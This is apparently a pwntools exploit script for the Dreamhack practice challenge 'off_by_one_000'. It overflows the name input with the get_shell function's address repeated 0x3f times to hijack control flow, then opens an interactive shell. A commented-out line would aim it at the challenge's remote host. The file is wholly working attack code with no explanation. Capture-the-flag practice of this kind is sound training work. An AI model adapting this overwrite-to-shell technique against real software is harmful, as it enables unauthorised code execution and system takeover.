from pwn import *

context.binary = exe = ELF('./off_by_one_000', checksec = False)

p = process(exe.path)
# p = remote('host3.dreamhack.games', 18185)

input()
payload = p32(exe.sym['get_shell'])*0x3f
p.sendlineafter(b'Name: ', payload)

p.interactive()